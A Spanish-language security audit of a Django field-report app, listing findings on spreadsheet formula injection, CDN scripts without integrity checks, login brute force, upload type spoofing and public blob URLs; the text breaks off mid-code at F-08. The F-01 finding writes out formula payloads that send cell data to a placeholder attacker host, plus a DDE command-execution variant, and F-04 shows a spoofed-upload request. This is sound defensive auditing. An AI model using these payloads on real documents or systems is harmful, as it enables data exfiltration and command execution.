# Security Pass — Generador de Reportes de Campo

Fecha: 2026-09-01
Rama: `docs/auditoria-y-rescate-specs`

Alcance revisado: producto/requisitos (`PRD.md`, `BACKLOG.md`,
`RESOLUCION-ADVERSARIAL.md`), arquitectura y decisiones (`TECH-DESIGN.md`,
`adrs/0001`–`0009`), specs vivas (`openspec/specs/`, 20 capacidades) y los
Threat Matrix de los ciclos archivados, código (`config/`, `usuarios/`,
`tipos_reporte/`, `reportes/`, `templates/`, `static/`, JS de la capa
offline y el service worker), tests (4 suites de app + `config/tests/`),
configuración y despliegue (`vercel.json`, `.vercelignore`, `.gitignore`,
`requirements.txt`).

Ninguna capa se omitió por falta de material. **No** se revisó: la
configuración real del proyecto en Vercel (variables de entorno,
Firewall/WAF, permisos del token de Blob) ni la base Neon en producción —
están fuera del repositorio y no son observables desde acá. Varios findings
dependen de esa configuración y lo dicen explícitamente.

## Resumen ejecutivo

El proyecto está, en lo estructural, notablemente por encima del promedio:
control de acceso consistente y probado, deserialización YAML segura y
deliberada, endurecimiento de transporte fail-loud, y disciplina de Threat
Matrix por cada ciclo de cambio. La mayoría de las categorías clásicas
(inyección SQL, XSS en plantillas, IDOR, redirect abierto, secretos
versionados) no produjeron hallazgos.

Los riesgos reales están en tres lugares distintos:

1. **El artefacto que el sistema existe para producir es inyectable.** Un
   valor de campo que empieza con `=` se escribe en el `.xlsx` como fórmula
   viva, no como texto (verificado empíricamente contra openpyxl). El
   documento se entrega fuera de la empresa.
2. **Tres scripts de terceros se cargan desde CDN sin `integrity`, y no hay
   CSP en ninguna respuesta.** Un compromiso de unpkg o jsDelivr entrega
   JavaScript arbitrario en las pantallas autenticadas.
3. **El login no tiene ningún límite de intentos.** Sin MFA, sin
   auto-registro y con cuentas creadas por un administrador, la fuerza bruta
   no encuentra ninguna fricción del lado de la aplicación.

Aparte, la aceptación de riesgo de ADR-0005 ("sin datos personales sensibles
de terceros") se tomó **antes** de que existieran los adjuntos fotográficos
del backlog #11. Esa premisa hoy es falsa y sostiene dos decisiones vigentes.

## Fortalezas de seguridad

Lo que ya funciona y no conviene tocar al remediar:

- **Control de acceso centralizado y sin duplicación.**
  `reportes/permisos.py::tiene_acceso` es un predicado puro y único;
  `views._reporte_accesible` (`reportes/views.py:129`) traduce a `Http404`
  con la misma respuesta para "no existe" y "sin acceso", sin filtrar
  existencia. Las mutaciones estrictamente del creador
  (`cerrar_reporte`, `invitar`, `eliminar_reporte`) deliberadamente **no**
  usan ese shim. `usuarios/decorators.py::solo_administradores` es el único
  mecanismo de gate del área de administración, sin guardas inline
  duplicadas. Hay 71 aserciones de control de acceso en la suite.
- **Deserialización YAML segura por diseño, no por accidente.**
  `tipos_reporte/validacion.py` documenta `yaml.safe_load` como único punto
  de entrada, con un test que ejerce `!!python/object/apply`.
- **Endurecimiento de transporte fail-loud.** `require_bool_env`
  (`config/settings.py:42`) rechaza `true`/`1`/`yes`: un typo no puede
  apagar `SESSION_COOKIE_SECURE`/`CSRF_COOKIE_SECURE`/`SECURE_SSL_REDIRECT`
  en silencio. `SECURE_PROXY_SSL_HEADER` está correctamente fijado para el
  edge de Vercel, y `SILENCED_SYSTEM_CHECKS` silencia `security.W021` **con
  razón escrita**, no por conveniencia. 15 tests cubren esta configuración.
- **Rol como fuente de verdad, respaldado por la base.**
  `usuarios/models.py` mantiene `is_staff` derivado de `rol` y lo respalda
  con dos `CheckConstraint` a nivel de motor — una escritura directa a la
  base que intente desalinearlos falla.
- **Secretos fuera del repositorio, con test.** `.env` no está trackeado;
  `config/tests/test_deployment_hygiene.py::test_a9` lo asegura de forma
  ejecutable. Ningún secreto hardcodeado en el código.
- **XSS de plantilla: limpio.** Cero `|safe`, `mark_safe`, `autoescape off`
  o `eval` en todo el árbol. Los tres `innerHTML` del JS offline
  interpolan solo literales y un contador entero local; el render dinámico
  de filas usa `textContent`.
- **Idempotencia como control, no como comodidad.** `iniciar_reporte`
  incluye `creador` en el `get_or_create` por `id_local`, así que un POST
  hostil que reusa el `id_local` ajeno cae en `IntegrityError` → 400, nunca
  en una entrega silenciosa del reporte de otro.
- **Disciplina de Threat Matrix por ciclo.** Cada cambio archivado en
  `openspec/changes/archive/` declara su matriz y ata tests RED a las filas
  aplicables. Es la razón por la que este pase encontró tan poco en las
  categorías clásicas.

## Findings

### HIGH

---

**ID** F-01
**Title** Inyección de fórmulas en el `.xlsx` generado
**Estado** RESUELTO (2026-09-01) — `_neutralizar_formula` en `generador.py`; 4 tests.
**Severity** HIGH
**Confidence** HIGH
**Category** Business-logic abuse / unsafe output encoding (CWE-1236)
**Affected artifact** Código; spec `generacion-documento`; spec `validacion-reporte`
**Location** `tipos_reporte/generador.py:210` (`_escribir_valores`)

**Description**
`_escribir_valores` asigna el valor capturado directamente a la celda:
`hoja[coordenada] = valores[clave]`. openpyxl **infiere el tipo de celda
desde el string**: cualquier valor que empiece con `=` se serializa como
fórmula (`data_type='f'`), no como texto. Ningún punto del camino —
`reportes/valores.py`, `reportes/validacion.py`, los formularios dinámicos
de `reportes/formularios.py` — neutraliza ese prefijo. Los campos del
wizard son de texto libre por diseño.

**Evidence**
Verificado empíricamente contra la versión de openpyxl instalada en `.venv`:

```
>>> ws['A1'] = '=WEBSERVICE("http://evil/")'
>>> ws['A1'].data_type
'f'
>>> ws['A2'] = 'texto normal'
>>> ws['A2'].data_type
's'
```

`_escribir_valores` (líneas 199-210) documenta explícitamente que escribe
"ANY key present in `valores`" y que `False`/`0`/`""` se escriben tal cual —
la ausencia de saneamiento es intencional respecto del *valor*, pero nadie
consideró el *tipo* que openpyxl deduce.

**Attack scenario**
Un usuario autenticado —creador, o cualquier participante invitado, ya que
`ParticipacionEnReporte` otorga edición total sobre todas las secciones—
escribe en un campo de texto del wizard:

```
=HYPERLINK("http://atacante/?d="&A1&A2,"Ver detalle")
```

o `=WEBSERVICE("http://atacante/?d="&A1)` en una versión de Excel que lo
soporte. El reporte pasa validación, recibe visto bueno y se genera. El
`.xlsx` se entrega al cliente/la empresa. Al abrirlo, Excel evalúa la
fórmula: filtra contenido de otras celdas del reporte hacia un servidor
externo, o presenta un enlace de phishing con apariencia legítima dentro
de un documento oficial de la empresa. La variante DDE
(`=cmd|'/c calc'!A0`) exige que la víctima acepte dos diálogos, pero los
vectores de exfiltración y de enlace no.

**Potential impact**
Exfiltración del contenido del reporte hacia un tercero, phishing con
credibilidad institucional, y —con interacción del usuario— ejecución de
comandos en la máquina de quien abre el archivo. El documento generado es
la razón de ser del producto y sale de la organización: el radio de daño
está fuera del perímetro de la aplicación.

**Existing mitigation**
Ninguna. `reportes/validacion.py` valida completitud y tipos de dato del
catálogo cerrado, no la forma del texto. Excel muestra advertencias solo
para DDE, no para `HYPERLINK` ni para fórmulas de cálculo.

**Recommended remediation**
Neutralizar en el punto de escritura, no en el de captura — un solo lugar,
imposible de eludir por otra ruta. En `_escribir_valores`, forzar el tipo
de celda para todo string proveniente de `valores`:

```python
_PREFIJOS_DE_FORMULA = ("=", "+", "-", "@", "\t", "\r")

celda = hoja[coordenada]
celda.value = valores[clave]
if isinstance(celda.value, str) and celda.value.startswith(_PREFIJOS_DE_FORMULA):
    celda.data_type = "s"
```

Preferir fijar `data_type = "s"` sobre anteponer una comilla simple: la
comilla es visible al editar la celda y ensucia el documento entregado.
Aplicar solo a los valores capturados, nunca a la plantilla.

**Suggested verification**
Test RED en `tipos_reporte/tests/test_generador.py`: generar con
`valores={"campo": "=1+1"}` y afirmar
`hoja["A1"].data_type == "s"` y `hoja["A1"].value == "=1+1"`.
Parametrizar sobre los seis prefijos.

**Required change type** `CODE FIX`

---

**ID** F-02
**Title** JavaScript de terceros desde CDN sin SRI, sin CSP y con versión flotante
**Estado** RESUELTO (2026-09-01) — librerias vendorizadas en `static/vendor/` + CSP en `config/seguridad.py` (modo Report-Only); 7 tests.
**Severity** HIGH
**Confidence** HIGH
**Category** Dependency / supply-chain risk
**Affected artifact** Código (plantillas); arquitectura (ADR-0004 depende de Dexie)
**Location** `reportes/templates/reportes/paso.html:7,18,19`;
`reportes/templates/reportes/mis_reportes.html:10`;
`reportes/templates/reportes/sincronizacion.html:10`

**Description**
Tres bibliotecas de terceros se cargan desde CDNs públicos en pantallas
**autenticadas**, sin atributo `integrity`:

| Script | Origen | Versión |
|---|---|---|
| `dexie.js` | `unpkg.com` | `dexie@3` — **flotante**, resuelve a la última 3.x |
| `heic2any.min.js` | `cdn.jsdelivr.net` | `0.0.4` (fija) |
| `browser-image-compression.js` | `cdn.jsdelivr.net` | `2.0.2` (fija) |

`crossorigin="anonymous"` está presente, pero por sí solo no verifica nada:
habilita CORS, no integridad. Sin `integrity`, el navegador ejecuta lo que
el CDN devuelva.

Agravante: **no existe ninguna cabecera `Content-Security-Policy` en el
proyecto** (búsqueda en todo el árbol: cero coincidencias). No hay
`django-csp` ni middleware propio. No hay segunda línea de defensa.

**Evidence**
`paso.html:16` contiene el comentario:
> ``no-`integrity` precedent above pending tasks.md 7.3.``

Es decir: el hueco está identificado internamente y quedó sin cerrar.
`dexie@3` sin versión exacta significa que los bytes servidos cambian solos
con cada release 3.x publicada.

**Attack scenario**
unpkg o jsDelivr sirven contenido comprometido —por compromiso del CDN, del
paquete npm upstream, o por publicación de una 3.x maliciosa que la versión
flotante adopta sola. En la siguiente carga de `/reportes/<id>/paso/<sec>/`
el navegador de un usuario autenticado ejecuta ese JavaScript con acceso
completo al DOM y a la sesión: lectura del token CSRF del formulario y
emisión de POSTs autenticados en nombre del usuario, o alteración silenciosa
de los valores del reporte antes de que se envíen al servidor. Precedente
real y masivo: polyfill.io, 2024.

**Potential impact**
Toma de control de cuentas y manipulación no detectable de reportes.
Se ejecuta exactamente en las pantallas donde se capturan y firman los
datos, y la manipulación sobreviviría a la revisión S-09 porque el valor
alterado se muestra alterado.

**Existing mitigation**
Los scripts propios se sirven vía WhiteNoise desde el mismo origen — esos
no están expuestos. `adjuntos.js` degrada correctamente si `Dexie` no está
definido, lo que limita el impacto de *indisponibilidad* del CDN, no el de
*compromiso*.

**Recommended remediation**
Dos pasos, en este orden:

1. **Auto-hospedar las tres bibliotecas** bajo `static/`, versionadas en el
   repositorio. El proyecto ya tiene el precedente exacto: `tokens.css`
   registra release tag + SHA-256 por archivo
   (`openspec/changes/archive/2026-08-31-retrofit-visual-design2/tasks.md:45`).
   Auto-hospedar además es coherente con el requisito offline: hoy, una
   primera visita sin señal no obtiene Dexie.
   Si se decide mantener el CDN, como mínimo fijar versión exacta
   (`dexie@3.2.x`) y agregar `integrity="sha384-…"`.
2. **Agregar CSP.** Empezar en `Content-Security-Policy-Report-Only` para
   medir, y converger a algo como
   `default-src 'self'; img-src 'self' https://*.public.blob.vercel-storage.com data:; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`.
   Nota: `paso.html:22`, `seleccion_tipo.html:53` y `sincronizacion.html:14`
   tienen `<script>` inline — habrá que moverlos a archivos o darles nonce
   antes de que `script-src 'self'` sea viable.

**Suggested verification**
Test que recorra todas las plantillas y afirme que ningún `<script src>`
apunta fuera del origen propio. Test de respuesta que afirme la presencia
de la cabecera CSP.

**Required change type** `CODE FIX`

---

**ID** F-03
**Title** Login sin límite de intentos ni bloqueo de cuenta
**Estado** ABIERTO — el dueño del producto decidió no implementarlo (2026-09-01). Es el único finding explotable desde afuera sin cuenta previa.
**Severity** HIGH
**Confidence** HIGH
**Category** Broken authentication / missing rate limiting
**Affected artifact** Código; ADR-0005; spec `usuarios-y-autenticacion`
**Location** `usuarios/urls.py:7-11` (`LoginView.as_view()` sin envolver);
`config/settings.py` (sin configuración de throttling)

**Description**
El login usa `django.contrib.auth.views.LoginView` tal cual. Django **no
trae** limitación de intentos: no hay `django-axes`, `django-ratelimit`,
ni contador de fallos propio. Un atacante puede probar contraseñas contra
cualquier `username` sin fricción alguna del lado de la aplicación.

Agravantes concretos de este sistema:

- **No hay MFA** (ADR-0005 no la contempla).
- **No hay auto-registro**: las cuentas las crea un administrador
  (`usuarios/forms.py::UsuarioCrearForm`), lo que en la práctica produce
  nombres de usuario predecibles y contraseñas iniciales asignadas por un
  tercero.
- Los validadores de Django exigen mínimo 8 caracteres y no-común: es el
  piso, no una defensa contra fuerza bruta sostenida.
- `usuarios_lista` permite a cualquier administrador enumerar usuarios, y
  `invitar` filtra existencia (ver F-08).

**Evidence**
`usuarios/urls.py`:

```python
path("login/", LoginView.as_view(redirect_authenticated_user=True), name="login"),
```

`usuarios/tests/test_login.py` cubre login exitoso, contraseña incorrecta,
cuenta inactiva y redirección — no hay ningún test de intentos repetidos,
porque no hay comportamiento que probar.

**Attack scenario**
Un atacante obtiene un nombre de usuario (LinkedIn, un `.xlsx` generado que
lleve el nombre del autor, o simplemente `admin`) y lanza credential
stuffing o un diccionario contra `POST /login/`. Nada lo detiene ni lo
registra como anomalía. Una cuenta con `rol=administrador` comprometida
otorga administración de usuarios, reseteo de contraseñas de terceros y
control del motor de definiciones.

**Potential impact**
Compromiso de cuenta. En el caso de una cuenta administradora, compromiso
total de la aplicación: `usuarios_resetear_password` permite fijar la
contraseña de cualquier usuario sin conocer la anterior.

**Existing mitigation**
`SECURE_SSL_REDIRECT` y cookies `Secure` protegen el transporte, no el
adivinado. Vercel mitiga DDoS volumétrico automáticamente, pero eso no es
lo mismo que rate limiting por credencial: una fuerza bruta lenta y
distribuida pasa por debajo.

**Recommended remediation**
Elegir una de las dos, no ambas:

- **`django-axes`** — bloqueo por combinación usuario+IP, con ventana y
  cooloff configurables. Es la opción estándar y trae auditoría.
- **Vercel Firewall / WAF** — regla de rate limiting sobre `POST /login/`.
  Sin dependencia nueva, pero vive fuera del repositorio y fuera de los
  tests, lo que choca con la disciplina de este proyecto.

Recomiendo `django-axes`: queda versionado, testeable y visible en el mismo
lugar donde vive el resto del control de acceso.

Independientemente de la opción: registrar los fallos de autenticación en
Sentry como evento — hoy no se registran en ningún lado.

**Suggested verification**
Test que emita N+1 intentos fallidos y afirme que el N+1 es rechazado aun
con la contraseña correcta. Test de que el cooloff libera la cuenta.

**Required change type** `CODE FIX`

### MEDIUM

---

**ID** F-04
**Title** La validación de adjuntos confía en el `Content-Type` que envía el cliente
**Estado** ABIERTO — descartado por el dueño del producto (2026-09-01).
**Severity** MEDIUM
**Confidence** HIGH
**Category** Unsafe input handling / unrestricted file upload
**Affected artifact** Código; spec `adjuntos-reporte` ("Format Allowlist")
**Location** `reportes/adjuntos.py:42`; `reportes/views.py:605,617-619`

**Description**
`validar_adjunto` decide con `archivo.content_type`, que es exactamente la
cabecera `Content-Type` de la parte multipart —un valor **elegido por el
cliente**— y no el contenido real del archivo. El nombre original
(`archivo.name`, con su extensión) también viaja sin validar y termina como
clave del blob.

Esto contradice de forma directa lo que el propio módulo declara en su
docstring (líneas 8-11):

> "el servidor NUNCA confía en el resultado de compresión/allowlist del
> lado del cliente"

El servidor no confía en el *resultado del filtro* del cliente, pero sí
confía en el *dato* que el cliente le manda para volver a filtrar. Es el
mismo control, movido un centímetro.

**Evidence**

```python
def validar_adjunto(archivo) -> str | None:
    if archivo.content_type not in FORMATOS_PERMITIDOS:   # línea 42
        return "formato-no-permitido"
```

Y en `views.py:617-619`, lo que se persiste:

```python
archivo=archivo,
nombre_original=archivo.name,
formato_original=archivo.content_type,   # el mismo valor no verificado
```

El comentario de `FORMATOS_PERMITIDOS` es explícito: las extensiones son
`"informational only; the server checks content-type"`.
`Adjunto.archivo` es un `FileField`, **no** `ImageField` (decisión D1
documentada, por HEIC), así que Django tampoco intenta decodificar.
`reportes/tests/test_adjuntos.py:85-95` parametriza por `content_type`,
confirmando que ese es el contrato probado.

**Attack scenario**
Un participante invitado emite el POST a mano (`curl`, DevTools):

```
POST /reportes/7/adjuntos/subir/
Content-Disposition: form-data; name="archivo"; filename="factura.html"
Content-Type: image/jpeg

<contenido HTML arbitrario>
```

Pasa la allowlist (declara `image/jpeg`) y pasa el límite de 8 MB. Se sube a
Vercel Blob con nombre `.html`; `vercel_blob` deriva el `Content-Type` de
almacenamiento desde la extensión, así que el blob se sirve como
`text/html` sobre `*.public.blob.vercel-storage.com` — un origen público,
sin autenticación (ver F-05). El resultado es hosting de contenido activo
arbitrario bajo un dominio de infraestructura de la empresa.

Conviene ser preciso sobre el alcance: **no** es XSS contra la aplicación,
porque el blob vive en otro origen y no comparte cookies con ella. El daño
es alojamiento de phishing/malware con procedencia aparentemente legítima,
y consumo de almacenamiento con contenido arbitrario.

**Potential impact**
Alojamiento de contenido activo arbitrario en infraestructura de la
empresa; phishing creíble; el `.xlsx` generado además intentará incrustar
el archivo y lo saltará (`generador.py:186-196` captura la excepción de
Pillow), así que el reporte sale silenciosamente sin la evidencia esperada.

**Existing mitigation**
El límite de 8 MB sí se aplica sobre `archivo.size`, que es real.
`_incrustar_adjuntos` no explota ante un archivo indecodificable. El
endpoint exige acceso al reporte (`_reporte_accesible`), así que el atacante
debe ser un usuario autenticado con acceso — esto acota la severidad a
MEDIUM, no HIGH.

**Recommended remediation**
Validar el contenido, no la declaración:

1. Leer los primeros bytes y verificar la firma real (*magic number*).
   Para el allowlist actual: JPEG `FF D8 FF`, PNG `89 50 4E 47`, WEBP
   `RIFF….WEBP`, HEIC/HEIF caja `ftyp` con marca `heic`/`heif`/`mif1`.
   No requiere dependencia nueva.
2. **Derivar la extensión almacenada del tipo verificado**, nunca del
   `filename` del cliente. Conservar `nombre_original` solo como metadato
   para mostrar (ya se escapa en plantilla).
3. Rechazar cuando la firma real y el `content_type` declarado no coincidan.

**Suggested verification**
Test que suba bytes de HTML declarando `image/jpeg` y afirme HTTP 400 y
`Adjunto.objects.count() == 0`. Test de que un JPEG real con `filename`
`a.html` se almacena con extensión `.jpg`.

**Required change type** `CODE FIX`

---

**ID** F-05
**Title** Adjuntos, plantillas y logos accesibles en URLs públicas sin autenticación
**Severity** MEDIUM
**Confidence** HIGH
**Estado** MITIGADO PARCIALMENTE — ver "Mitigación aplicada" al final del finding.
El riesgo de fondo (URL pública no revocable) **sigue abierto**.
**Category** Sensitive data exposure across a trust boundary
**Affected artifact** Arquitectura (ADR-0005, ADR-0009); código; spec `adjuntos-reporte`
**Location** `config/storage.py:20-36`; `reportes/models.py:252-254`;
`reportes/views.py:668-681`

**Description**
`VercelBlobStorage._save` sube con `blob_store.put(...)` y devuelve la URL
pública del blob como *nombre almacenado*; `url()` la devuelve tal cual.
`Adjunto.archivo` hereda `STORAGES["default"]`, así que **toda foto de
campo queda en una URL pública, permanente y no revocable**, servida sin
ninguna verificación de sesión.

El listado (`adjuntos_de_reporte`) sí está correctamente alcanzado por
`_reporte_accesible` — el control de acceso protege *el índice*, no *el
recurso*. Quien obtenga la URL por cualquier vía (historial del navegador,
un log de proxy, una captura de pantalla, un `Referer`) la conserva para
siempre.

**Evidence**
El propio código lo documenta como limitación conocida
(`reportes/views.py:675-677`):

> "the underlying Vercel Blob URL is public-but-unguessable (design's known,
> accepted limitation, unchanged from `plantilla`/`logo`)"

`storage.py:30-33` confirma que `addRandomSuffix` es el único mecanismo de
protección: seguridad por impredecibilidad, sin caducidad ni revocación.

**Lo que hace que esto merezca revisarse ahora, y no sea solo repetir una
decisión ya tomada:** ADR-0005 justifica su aceptación de riesgo diciendo
que se trata de "reportes de control de calidad, **sin datos personales
sensibles de terceros**". Esa afirmación se escribió antes de que existieran
los adjuntos: el backlog #11 (agosto 2026) incorporó fotografías tomadas en
faena. Una foto de instalación puede contener rostros de personal, patentes
de vehículos, documentación en pantalla y metadatos EXIF con
geolocalización — que nada en el pipeline elimina. La premisa que sostiene
la decisión dejó de ser cierta; la decisión nunca se revisó.

**Attack scenario**
Un `.xlsx` generado se reenvía a un contratista externo. Aunque las
imágenes van incrustadas, cualquier participante con acceso al listado
puede copiar la URL del blob y compartirla. El receptor —o cualquiera a
quien él la reenvíe, o cualquier proxy corporativo que la registre— accede
al archivo original sin credenciales, indefinidamente, aun después de que
se revoque su acceso al reporte o el reporte se elimine (el soft-delete de
`eliminar_reporte` no borra blobs).

**Potential impact**
Exposición no revocable de imágenes de faena, potencialmente con datos
personales de terceros y geolocalización. Implicancias regulatorias si la
jurisdicción aplica normativa de datos personales — no evaluable desde el
repositorio.

**Existing mitigation**
`addRandomSuffix` hace las URLs no adivinables por fuerza bruta. El listado
está access-scoped. Nada de eso ayuda una vez que la URL circuló.

**Recommended remediation**
Tres opciones reales, en orden de esfuerzo creciente:

1. **Mínimo viable**: strip de EXIF al subir (Pillow ya es dependencia) y
   borrado del blob en `eliminar_reporte`. No cierra el problema; reduce el
   dato expuesto y la superficie temporal.
2. **Correcto**: pasar a blobs privados y servir por una vista Django
   access-scoped que haga *stream* o emita una URL firmada de vida corta.
   Cuesta latencia y tiempo de función.
3. Documentar y aceptar formalmente, **con la premisa corregida**.

La 1 y la 3 son compatibles y probablemente sean el punto de partida
razonable. La decisión no es mía.

**Suggested verification**
Test de que un adjunto subido no conserva tags EXIF de GPS. Test de que
`eliminar_reporte` invoca `delete()` sobre cada blob asociado.

**Required change type** `DESIGN / ADR CHANGE`

**Mitigación aplicada (opción 1, 2026-09-01)**

Se implementó la mitigación barata. **No cierra el finding**: la URL sigue
siendo pública, permanente y no revocable. Reduce qué expone y por cuánto
tiempo.

1. **Strip de metadatos al subir** — `reportes/adjuntos.py::limpiar_metadatos`,
   llamado desde `views.subir_adjunto` *antes* de escribir el blob. Pillow
   re-guarda la imagen sin pasarle `exif`, lo que elimina el bloque completo
   incluido el sub-IFD de GPS. JPEG usa `quality="keep"` (reusa las tablas de
   cuantización originales, así que los píxeles decodificados son idénticos),
   PNG es lossless por definición y WEBP se fuerza a lossless.
2. **Borrado de blobs al eliminar un reporte** —
   `views._borrar_archivos_de_adjuntos`. El soft-delete sigue conservando
   todas las filas para auditoría; ahora los bytes públicamente legibles sí
   se borran. `try` por adjunto: un fallo de storage no aborta el borrado ni
   deja los demás archivos atrás, y queda logueado para limpieza manual.

**Límite conocido, no accidental:** este Pillow (12.3.0) **no trae códec
HEIF**, y `FORMATOS_PERMITIDOS` admite `image/heic`/`image/heif`. Un HEIC sin
convertir no se puede decodificar, así que pasa intacto **con su GPS
adentro**. `limpiar_metadatos` devuelve el original en vez de fallar, igual
que `generador._incrustar_adjuntos`: un control de privacidad no puede
convertirse en una nueva forma de romper una subida en faena. En la práctica
`adjuntos.js` convierte HEIC a JPEG del lado del cliente, pero eso es
best-effort y el servidor no se apoya en eso.

Para cerrar ese hueco haría falta agregar `pillow-heif` a las dependencias, o
rechazar HEIC en el servidor — lo segundo es un cambio de producto, no de
código.

Cobertura: 7 tests en `reportes/tests/test_adjuntos.py`, incluido uno que
verifica que el JPEG de prueba realmente trae GPS (sin él, los demás pasarían
sin probar nada).

---

**ID** F-06
**Title** Subida de adjuntos sin tope de cantidad ni rate limiting
**Estado** RESUELTO (2026-09-01) — `SUBIDAS_MAXIMAS_POR_HORA = 60` por usuario (uso real: ~4). Sin límite de producto, solo de abuso; 3 tests.
**Severity** MEDIUM
**Confidence** HIGH
**Category** Resource exhaustion / cost abuse
**Affected artifact** Spec `adjuntos-reporte`; código
**Location** `reportes/views.py:576-635`; `reportes/models.py:238-243`

**Description**
`subir_adjunto` no impone tope de cantidad por reporte, ni por usuario, ni
por unidad de tiempo. Cada request admite hasta 8 MB. Cualquier usuario
autenticado con acceso a un reporte puede emitir requests en bucle.

Esto **no es un descuido**: es una decisión explícita de la spec, citada en
el docstring del modelo:

> "No `unique` constraint and no count cap: the spec forbids a maximum
> attachment count"

y probada deliberadamente en
`test_adjuntos.py:260::test_multiples_adjuntos_sin_limite_de_cantidad`.

Lo reporto igual porque la spec prohibió un **límite de producto** (no
frustrar a quien necesita 30 fotos), y eso se implementó como **ausencia
total de cualquier límite**, incluido el de abuso. Son dos preguntas
distintas que quedaron respondidas con una sola decisión.

**Evidence**
No hay contador, ni ventana temporal, ni `DATA_UPLOAD_MAX_NUMBER_FILES`
relevante (el endpoint acepta un archivo por request, en bucle).
`config/settings.py` no configura throttling de ningún tipo.

**Attack scenario**
Una cuenta comprometida —o un usuario interno molesto— sube 8 MB en bucle
contra un reporte al que tiene acceso. Vercel Blob se factura por
almacenamiento y transferencia; las funciones, por CPU activo e
invocaciones. El costo es directo, continuo y no tiene techo. La aplicación
no lo detecta: no hay alerta, y `Adjunto` no se cuenta en ningún lado.

**Potential impact**
Gasto no acotado en Vercel Blob y funciones. Degradación de la pantalla de
adjuntos de ese reporte. No hay pérdida de datos ni caída total.

**Existing mitigation**
El tope de 8 MB por archivo acota cada request individual.
`_reporte_accesible` exige ser creador o invitado, así que no es explotable
de forma anónima.

**Recommended remediation**
Separar las dos preguntas que la spec fusionó:

- Mantener sin límite de producto la cantidad de adjuntos por reporte.
- Agregar un límite de **abuso**, invisible en uso normal: por ejemplo, N
  subidas por usuario por hora, o un tope de bytes acumulados por reporte
  bastante por encima del uso legítimo. El número correcto lo define quien
  conozca el uso real en faena.
- Configurar una alerta de gasto en Vercel, independientemente del código.

**Suggested verification**
Test de que la subida N+1 dentro de la ventana devuelve 429 y no crea fila.
Test de que N subidas legítimas siguen pasando.

**Required change type** `PRODUCT / REQUIREMENT CHANGE`

---

**ID** F-07
**Title** Dependencias sin fijar y sin lockfile
**Estado** ABIERTO — analizado y bloqueado por F-14 (el entorno local no es el de producción). Procedimiento documentado abajo.
**Severity** MEDIUM
**Confidence** HIGH
**Category** Dependency / supply-chain risk
**Affected artifact** Configuración / despliegue
**Location** `requirements.txt`; `requirements-dev.txt`; `pyproject.toml`

**Description**
Las 11 dependencias de producción se declaran con rangos abiertos
(`Django>=5.2.8,<6.0`, `Pillow>=11.3,<13`, `requests>=2.32,<3`, …). No
existe `requirements.lock`, `pip-compile`, `uv.lock` ni hashes. Vercel
resuelve el árbol en cada build, así que **dos despliegues del mismo commit
pueden instalar versiones distintas**, incluidas dependencias transitivas
que nadie declaró.

**Evidence**
`requirements.txt` completo usa rangos; no hay archivo de lock en el árbol.
`vercel.json` solo declara `buildCommand`, sin paso de instalación
determinista.

**Attack scenario**
Una versión comprometida se publica en PyPI dentro de un rango aceptado —
`requests`, `Pillow` y `sentry-sdk` son objetivos históricos de
typosquatting y de compromiso de mantenedor. El siguiente build de Vercel la
instala sin que ningún commit cambie y sin que nadie lo note. El código se
ejecuta del lado del servidor, con `DATABASE_URL` y `BLOB_READ_WRITE_TOKEN`
en el entorno.

**Potential impact**
Ejecución de código en el servidor con acceso a la base de producción y al
token de Blob. Es el peor caso de todo este informe en términos de alcance,
pero requiere un compromiso upstream, que no está bajo control del
proyecto — de ahí MEDIUM y no HIGH.

**Existing mitigation**
Los límites superiores (`<6.0`, `<13`, `<3`) evitan saltos de major
inesperados. `.python-version` fija el intérprete, y el README explica por
qué. Es disciplina real, aplicada al runtime pero no a las dependencias.

**Recommended remediation**
Generar un lockfile con hashes (`pip-compile --generate-hashes`, o
`uv lock`) y comprometerlo; instalar con `--require-hashes` en el build.
Agregar `pip-audit` al flujo, aunque sea manual y documentado. Es coherente
con la disciplina que el proyecto ya aplica a `.python-version` y a los
assets de `tokens.css`.

**Suggested verification**
Que el build falle si el lockfile no coincide con `requirements.txt`.

**Required change type** `PROCESS / HARNESS CHANGE`

**Análisis del cómo (2026-09-01) — y por qué NO se generó el lockfile acá**

Se evaluaron tres caminos:

| Opción | Veredicto |
|---|---|
| `pip freeze > requirements.txt` | **Descartada.** Congela versiones pero sin hashes, así que no protege contra un paquete recompilado y republicado bajo la misma versión. Además arrastra las dependencias de desarrollo. |
| `uv lock` | Buena herramienta, pero introduce un gestor nuevo en un proyecto que hoy usa `pip` puro, y Vercel instala desde `requirements.txt`. Costo de migración desproporcionado para el problema. |
| **`pip-compile --generate-hashes`** (pip-tools) | **Elegida.** Produce un `requirements.txt` con todas las transitivas fijadas y sus hashes SHA-256. `pip` entra solo en modo hash-checking cuando detecta hashes en el archivo, así que **el build de Vercel no cambia**: sigue siendo `pip install -r requirements.txt`. |

**El bloqueo, y por qué no lo forcé:** un lockfile con hashes es específico de la
plataforma y de la versión de Python, porque fija los *wheels* concretos.
Este proyecto tiene `psycopg-binary`, `Pillow` y `charset-normalizer`, los tres
con wheels compilados distintos por plataforma.

Y la máquina desde la que se hizo esta auditoría es:

```
Windows-11-10.0.26200-SP0
Python 3.14.6
```

mientras que producción corre **Linux con Python 3.12** (`.python-version`).
Generar el lockfile acá produciría hashes de wheels de Windows/3.14 que **no
existen** en el entorno de Vercel: el build fallaría, o —peor— alguien borraría
los hashes para desbloquearlo y quedaríamos igual que antes pero con la
sensación de estar protegidos.

**Procedimiento correcto**, para correr en Linux con Python 3.12 (CI, Docker o
WSL), una sola vez:

```bash
# 1. requirements.in pasa a ser el archivo que se edita a mano:
#    exactamente el contenido actual de requirements.txt, con sus rangos.
mv requirements.txt requirements.in

# 2. Generar el lockfile resuelto y hasheado.
pip install pip-tools
pip-compile --generate-hashes --output-file=requirements.txt requirements.in

# 3. Verificar en el mismo entorno antes de commitear.
pip install --require-hashes -r requirements.txt
```

Desde ahí, agregar o subir una dependencia es editar `requirements.in` y volver
a correr el paso 2. Conviene sumar `pip-audit` al mismo flujo.

No se creó un `requirements.in` a medias en este pase: media herramienta que
nadie termina de conectar es peor que una instrucción clara, porque parece
resuelto sin estarlo.

### LOW

---

**ID** F-08
**Title** El formulario de invitación confirma qué nombres de usuario existen
**Estado** ACEPTADO por el dueño del producto (2026-09-01).
**Severity** LOW
**Confidence** HIGH
**Category** Information disclosure
**Affected artifact** Código; spec `colaboracion-reporte`
**Location** `reportes/views.py:456-458`

**Description**
`invitar` responde con mensajes distinguibles:
`"No existe un usuario con el nombre «x»."` frente al éxito. Permite a
cualquier creador de reporte enumerar la nómina de usuarios probando
nombres.

**Evidence**

```python
